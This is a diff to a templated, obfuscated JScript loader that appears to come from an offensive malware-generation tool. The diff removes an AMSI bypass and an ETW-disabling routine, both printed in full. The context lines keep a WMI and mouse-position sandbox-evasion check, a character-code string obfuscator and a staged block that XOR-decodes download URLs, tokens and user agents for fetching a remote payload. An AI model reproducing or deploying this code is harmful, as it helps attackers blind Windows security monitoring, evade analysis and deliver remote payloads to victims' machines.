@@ -9,26 +9,6 @@
     <![CDATA[
     function {{ v.fn_build_str }}(a){var {{ v.jsc_lv_bs }}="";for(var {{ v.jsc_lv_bi }}=0;{{ v.jsc_lv_bi }}<a.length;{{ v.jsc_lv_bi }}++){{ v.jsc_lv_bs }}+=String.fromCharCode(a[{{ v.jsc_lv_bi }}]);return {{ v.jsc_lv_bs }};}
 
-    function {{ v.fn_amsi }}() {
-        try {
-            var {{ v.jsc_lv_aa }}  = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
-            var {{ v.jsc_lv_at }} = {{ v.jsc_lv_aa }}.GetType({{ v.fn_build_str }}([{{ v.jsc_auto_amsi_utils }}]));
-            if ({{ v.jsc_lv_at }} !== null)
-                {{ v.jsc_lv_at }}.GetField({{ v.fn_build_str }}([{{ v.jsc_amsi_init_fail }}]), (4|32)).SetValue(null, true);
-        } catch(e) {}
-    }
-
-    function {{ v.fn_etw }}() {
-        try {
-            var {{ v.jsc_lv_ea }} = new ActiveXObject({{ v.fn_build_str }}([{{ v.jsc_sys_refl_asm }}]));
-            var {{ v.jsc_lv_et }}   = {{ v.jsc_lv_ea }}.GetType({{ v.fn_build_str }}([{{ v.jsc_eventing_ep }}]));
-            if ({{ v.jsc_lv_et }} !== null) {
-                var {{ v.jsc_lv_ef }} = {{ v.jsc_lv_et }}.GetField({{ v.fn_build_str }}([{{ v.jsc_m_enabled }}]), (4|32));
-                if ({{ v.jsc_lv_ef }} !== null) {{ v.jsc_lv_ef }}.SetValue(null, 0);
-            }
-        } catch(e) {}
-    }
-
     function {{ v.fn_sandbox }}() {
         try {
             var {{ v.jsc_lv_wmi }}  = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
@@ -117,8 +97,6 @@
                 if({{ v.jsc_lv_pp2 }}){var {{ v.jsc_lv_ps2 }}={{ v.jsc_lv_pp2 }}.GetValue(null,null);if({{ v.jsc_lv_ps2 }}){var {{ v.jsc_lv_cx2 }}={{ v.jsc_lv_ps2 }}.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue({{ v.jsc_lv_ps2 }},null);var {{ v.jsc_lv_cy2 }}={{ v.jsc_lv_ps2 }}.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue({{ v.jsc_lv_ps2 }},null);if({{ v.jsc_lv_cx }}==={{ v.jsc_lv_cx2 }}&&{{ v.jsc_lv_cy }}==={{ v.jsc_lv_cy2 }})return;}}}}
             } catch(_e2) {}
         }
-        {{ v.fn_amsi }}();
-        {{ v.fn_etw }}();
         {%- if is_staged %}
         var {{ sg.sg_lv_url }}=[{{ staged_url_csv }}],{{ sg.sg_lv_jwt }}=[{{ staged_jwt_csv }}],{{ sg.sg_lv_ua }}=[{{ staged_ua_csv }}];
         for(var {{ sg.sg_lv_i }}=0;{{ sg.sg_lv_i }}<{{ sg.sg_lv_url }}.length;{{ sg.sg_lv_i }}++){{ sg.sg_lv_url }}[{{ sg.sg_lv_i }}]^={{ staged_url_xk }};
